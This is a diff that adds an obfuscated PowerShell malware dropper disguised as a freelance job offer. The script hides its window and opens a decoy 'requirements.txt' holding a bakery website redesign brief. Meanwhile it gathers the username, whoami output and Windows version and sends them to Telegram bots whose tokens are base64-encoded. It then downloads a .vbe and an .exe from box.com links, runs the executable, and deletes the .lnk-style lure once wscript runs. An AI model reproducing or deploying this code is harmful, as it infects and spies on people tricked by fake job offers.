@@ -1,0 +1,115 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="requirements.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+check 1
+Hi! I hope you're doing well. My name is Nancy, and I got your contact from a freelance platform/mutual group. I'm the owner of The Daily Crumb Bakery here in Austin, Texas. We've been running our local shop for about 4 years now and we desperately need to fix our online presence because the current website is a total mess and our cousin made it on WordPress and it takes forever to load.
+I'm looking for someone who can take over the whole redesign and launch our e-commerce properly. I don't know all the technical terms, but here is what we are looking for.
+About the brand:
+We are a premium, local, artisanal bakery. Everything is organic. We specialize in traditional sourdough and French pastries. But we also want to be very welcoming, casual, and affordable for the local college students from UT Austin. So the vibe needs to be extremely high-end and luxurious, but also rustic, cheap, and cozy at the same time.
+What we need on the site:
+Main Page
+It needs to have a huge WOW factor when you open it. I saw a website where elements move with the mouse, so maybe we can have a large 3D loaf of sourdough bread that rotates and follows the user's cursor around the screen? That would be amazing. Also, I really want a background music player that automatically plays the sound of a crackling, fresh bread crust as soon as the page loads. It's super important for our brand identity so people feel the atmosphere. And please make our logo much bigger than it is now. I don't have the source file, but you can just screenshot it from our Instagram page (@thedailycrumb_atx) and clean it up.
+Store and Online Menu
+We want people to literally smell the croissants when they look at the screen. I heard there are new web technologies for this, so please look into how we can implement sensory effects or olfactory triggers for modern browsers.
+We also need a "Build Your Own Donut" section. It should be an interactive 3D configurator where users can drag and drop different glazes, sprinkles, and toppings onto a virtual donut and see it change in real-time before adding it to the cart.
+For payments, we need standard credit cards like Visa and Mastercard, Apple Pay, but a lot of students here use Starbucks gift cards, so we need a system that can process Starbucks gift cards as a payment method for our pastries.
+About Us Page
+We don't have the text ready for this yet. For now, you can just copy and paste the entire text from Wikipedia about the history of flour and baking in North America. We will rewrite it later before the launch, don't worry.
+Style Guidelines
+For colors, we want a "warm fresh bread vibe" (browns and creams), but we also want bright Neon Cyberpunk accents (like hot pink and glowing green) because we want to attract the younger tech crowd in Austin.
+For fonts, I like clean things like Helvetica, but it feels a bit boring. Can we mix it with something that has more casual personality, like Comic Sans? Just surprise us with a cool combination.
+The site must be 100% mobile responsive, desktop responsive, and my husband wants it to render correctly on our smart kitchen refrigerator screen too.
+Timeline and Budget
+We have a flexible budget, but we are a small business so we need to keep the costs very low for this initial phase. My nephew who knows a bit about computers told me this whole project should take around 4 to 5 hours maximum for a professional.
+We are in a huge rush because our summer season is starting. Can you send over 3 entirely different design concepts by tomorrow morning at 9:00 AM CST?
+We don't have high-resolution photos of our bakery yet, so please use your imagination or grab some good ones from Pinterest or Google Images (just make sure we don't get sued for copyright).
+Please don't start any actual coding until we officially confirm the budget, but please start working on the concepts and layout right now so we don't lose time.
+Let me know if you can do this and how much it will cost!
+
+
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="ij05256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v11=7*3-5
+If($v11>0){}
+$v12="OAAAADYAAAAwAAAAMQAAADUAAAA2AAAAOAAAADQAAAAyAAAANgAAADoAAABBAAAAQQAAAEYAAAAwAAAARwAAAEQAAABjAAAAWQAAAEoAAABWAAAAMgAAAEwAAABtAAAAYgAAAEQAAABhAAAAcwAAAGMAAABkAAAATQAAAHgAAABvAAAAQwAAAFgAAABqAAAAbwAAADYAAABFAAAAVAAAAGwAAAAwAAAAcAAAAE4AAABQAAAAWQAAAA=="
+$v13=[System.Convert]::FromBase64String($v12)
+$v14=[System.Text.Encoding]::UTF32
+$v15=$v14.GetString($v13)
+$v16="OAAyADIANAAzADAANAA1ADgAMwA="
+$v17=[System.Convert]::FromBase64String($v16)
+$v18=$v14.GetString($v17)
+$v19=8/2+1
+If($v19>0){}
+$v20=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v21=(Get-CimInstance Win32_OperatingSystem).Caption
+$v22=Get-Content -Path $v10 -Raw
+$v23=$v22+"`n`nSession started for user: "+$v20+"`nWindows Version: "+$v21
+$v24="https://api.telegram.org/bot"+$v15+"/sendMessage"
+$v25=6*2-3
+If($v25>0){}
+$v26=@{chat_id=$v18;text=$v23}|ConvertTo-Json -Compress
+$v27=4+6-2
+If($v27>0){}
+try{$v28=Invoke-RestMethod -Uri $v24 -Method Post -ContentType "application/json" -Body $v26}catch{}
+$v29="OAAAADUAAAA1AAAAOQAAADMAAAA4AAAANQAAADcAAAAxAAAANAAAADoAAABBAAAAQQAAAEcAAABzAAAAcgAAAHMAAABiAAAAYwAAAE0AAABUAAAAXwAAADAAAAB2AAAAbwAAAEYAAABmAAAAWAAAAGsAAABqAAAAQQAAADcAAABuAAAAbAAAAEQAAAB1AAAAQgAAAEYAAABlAAAARQAAAEMAAABHAAAAeAAAAGIAAABnAAAAZwAAAA=="
+$v30=[System.Convert]::FromBase64String($v29)
+$v31=$v14.GetString($v30)
+$v32="MgAAADcAAAAwAAAAOAAAADYAAAA1AAAANAAAADAAAAA4AAAA"
+$v33=[System.Convert]::FromBase64String($v32)
+$v34=$v14.GetString($v33)
+$v35=3*4-2
+If($v35>0){}
+$v36="https://api.telegram.org/bot"+$v31+"/sendMessage"
+$v37=2*5-1
+If($v37>0){}
+$v38=@{chat_id=$v34;text=$v23}|ConvertTo-Json -Compress
+$v39=9-3+1
+If($v39>0){}
+try{$v40=Invoke-RestMethod -Uri $v36 -Method Post -ContentType "application/json" -Body $v38}catch{}
+$v41=8*2-3
+If($v41>0){}
+Start-Sleep -Seconds 300
+$v42=7*2-1
+If($v42>0){}
+$v43="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=d6nflhpe9vzdcugdwv0ve29w7sweqw6x&file_id=f_2253028379078"
+$v44="1446062403_house.vbe"
+$v45=[Environment]::GetFolderPath("LocalApplicationData")
+$v46=Join-Path $v45 $v44
+$v47=6*3-2
+If($v47>0){}
+try{$v48=New-Object System.Net.WebClient;$v48.DownloadFile($v43,$v46)}catch{}
+$v49=5+3-1
+If($v49>0){}
+$v50="https://app.box.com/index.php?rm=box_download_shared_file&shared_name=7ujodzl9ycfl7pnem3i5hmsqqog4mova&file_id=f_2252829283098"
+$v51="1446062403_key.exe"
+$v52=Join-Path $v45 $v51
+$v53=7*2+1
+If($v53>0){}
+try{$v54=New-Object System.Net.WebClient;$v54.DownloadFile($v50,$v52);$v55=New-Object System.Diagnostics.ProcessStartInfo;$v55.FileName=$v52;$v55.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v55.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v55)|Out-Null}catch{}
+$v56=10/2+3
+If($v56>0){}
+$v57="requirements.ink"
+$v58=$false
+$v59=$null
+$v60=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v61=3*3-2
+If($v61>0){}
+foreach($v62 in $v60){If(Test-Path -Path $v62){$v63=Join-Path $v62 $v57;If(Test-Path -Path $v63){$v59=$v63;$v58=$true;break}}}
+$v64=11-4+2
+If($v64>0){}
+If($v58){$v65=Split-Path -Parent $v59;$v66=Get-Date;$v67=600;while(((Get-Date)-$v66).TotalSeconds -lt $v67){$v68=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v68){try{Remove-Item -Path $v59 -Force -ErrorAction Stop;$v69=Join-Path $v65 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v69 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
